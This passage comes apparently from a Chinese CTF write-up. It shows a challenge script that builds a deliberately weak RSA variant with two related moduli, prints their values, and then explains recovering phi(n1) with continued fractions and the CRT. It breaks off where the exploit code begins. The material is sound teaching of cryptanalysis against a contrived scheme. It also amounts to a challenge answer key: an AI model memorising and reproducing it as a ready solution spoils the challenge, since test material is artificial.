class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> FLAG<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(FLAG)==<span class="hljs-number">47</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pub_key</span>(<span class="hljs-params">bit_n, bit_lucky</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">2</span>*bit_lucky &lt; bit_n<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        ran_num1, ran_num2 = randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky)), randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_n // <span class="hljs-number">2</span> - bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_n // <span class="hljs-number">2</span> - bit_lucky))<br>        g = ran_num1 * ran_num2 + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> isPrime(g):<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                ran_num3, ran_num4 = randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky)), randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_n // <span class="hljs-number">2</span> - bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_n // <span class="hljs-number">2</span> - bit_lucky))<br>                j = ran_num1 * ran_num4 + <span class="hljs-number">1</span><br>                t = ran_num3 * ran_num4 + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> isPrime(j) <span class="hljs-keyword">and</span> isPrime(t):<br>                    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                        e = randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky))<br>                        <span class="hljs-keyword">if</span> gcd(e, ran_num1 * ran_num2 * ran_num3 * ran_num4) == <span class="hljs-number">1</span>:<br>                            phi = (g - <span class="hljs-number">1</span>) * (t - <span class="hljs-number">1</span>)<br>                            d = inverse(e, phi)<br>                            k = (e * d - <span class="hljs-number">1</span>) // phi<br>                            o = k * ran_num2 + <span class="hljs-number">1</span><br>                            <span class="hljs-keyword">if</span> isPrime(o):<br>                                n1, n2 = g * t, j * o<br>                                <span class="hljs-keyword">return</span> (e, n1, n2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, e,n</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(msg, e, n)<br><br>bit_n, bit_lucky = <span class="hljs-number">1024</span>, <span class="hljs-number">256</span><br><br>e, n1, n2 = get_pub_key(bit_n, bit_lucky)<br><br>FLAG = bytes_to_long(FLAG.encode())<br><br>c1 = encrypt(FLAG, e, n1)<br>c2 = encrypt(FLAG, e, n2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e =&#x27;</span>, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n1 =&#x27;</span>, n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n2 =&#x27;</span>, n2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1 =&#x27;</span>, c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2 =&#x27;</span>, c2)<br><br><br><span class="hljs-comment">#e = 77493305850606946966866586869701562747566137421194857276849326558383863716599</span><br><span class="hljs-comment">#n1 = 38214712801044280452242029022307023900010505700133304226967361821658293768459754887223522190673421124166486124464596635967747405359806642464884601455285823454970604600165907209542618963333642882524596571019916658676095313436156240684679902251615046617153094607425987125749225956361360222801251450373042579071</span><br><span class="hljs-comment">#n2 = 11918534754165556595562303500191427316052163288557481525821438608864207524482981704928088272082867228651327063972728644192877335261376841505970220897803876176646736511250339814035116162036800063521023303060582016775080988747746487028664050144843952770605999675734459531886474293242344088869877433555271258269</span><br><span class="hljs-comment">#enc1 = 15808757304442558489652709164051631267713593320560967145595438513675108079906680505924179038743563463272753097766933667737349956243897214853643343110837736923623483907392474855188388096345292952323482631367759757699216716624973244377786699291503949070419765404840454938181818882998235566160193218211345167102</span><br><span class="hljs-comment">#enc2 = 6376686158682997059741103218078544724010800198504747162290763103690338182777916072489234933936183210135919268370502287963945937266836059808775864844630371956704383598114953698187649635431791980376016420776898290168916806683089572655387949425292390749405301644222442142567586889975355029412203353803624681004</span><br></code></pre></td></tr></table></figure><h2 id="分析-6"><a class="markdownIt-Anchor" href="#分析-6"></a> 分析</h2><blockquote><p>参考xenny师傅的wp</p><p><a href="https://www.nssctf.cn/note/set/135">文章列表 | NSSCTF</a></p></blockquote><p>利用连分数处理</p><p>有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>=</mo><msub><mi>r</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>3</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>4</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">n_1=r_1*r_2*r_3*r_4+.....</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>2</mn></msub><mo>=</mo><msub><mi>r</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>3</mn></msub><mo>∗</mo><mi>k</mi><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">n_2=r_1*r_3*k*r_2+...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><msub><mi>n</mi><mn>2</mn></msub><msub><mi>n</mi><mn>1</mn></msub></mfrac><mo>≈</mo><mfrac><mi>k</mi><msub><mi>r</mi><mn>3</mn></msub></mfrac></mrow><annotation encoding="application/x-tex">\frac{n_2}{n_1}≈\frac{k}{r_3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.20744em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>然后有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>≡</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">kφ(n_1)+1\equiv0\quad mod(e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mo>−</mo><mi>k</mi><mi>r</mi><mo stretchy="false">)</mo><mo>≡</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">kφ(n_1)+(-kr)\equiv0\quad mod(e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><mi>r</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ(n_1)\equiv r\quad mod(e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p>又有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ(n_1)\equiv0\quad mod(r_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>这样就可以利用中国剩余定理求解<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ(n_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>了</p><p>crt求解出来的是满足解的最小值，显然不符合要求</p><p>所有我们需要对其加上x个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mo>∗</mo><msub><mi>r</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><msub><mi>r</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(e*r_3)/gcd(e,r_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><h2 id="exp-6"><a class="markdownIt-Anchor" href="#exp-6"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 